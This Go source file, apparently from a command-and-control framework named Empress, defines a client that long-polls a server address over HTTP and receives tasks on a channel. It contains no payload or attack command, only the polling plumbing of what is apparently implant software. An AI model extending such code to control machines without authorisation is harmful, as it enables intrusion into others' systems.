package c2

import (
	"github.com/pygrum/Empress/transport"
	"golang.org/x/net/publicsuffix"
	"net/http"
	"net/http/cookiejar"
	"time"
)

const maxDuration time.Duration = 1<<63 - 1

type Client struct {
	Address      string
	ClientInfo   *transport.Registration
	HttpClient   *http.Client
	Task         chan *transport.Request // A channel that receives tasks from the longPoll routine
	router       *Router
	nextResponse *transport.Response
}

func NewClient(addr string) (*Client, error) {
	jar, err := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List})
	if err != nil {
		return nil, err
	}
	return &Client{
		ClientInfo: &transport.Registration{},
		HttpClient: &http.Client{
			Timeout: maxDuration, // Polling client. Timeout has no effect if we get a connection refused
			Jar:     jar,
		},
		Address: addr,
		Task:    make(chan *transport.Request),
	}, nil
}

func (c *Client) SetRouter(r *Router) {
	c.router = r
}
func (c *Client) Router() *Router {
	return c.router
}

func (c *Client) SetResponse(r *transport.Response) {
	c.nextResponse = r
}

func (c *Client) Response() *transport.Response {
	return c.nextResponse
}
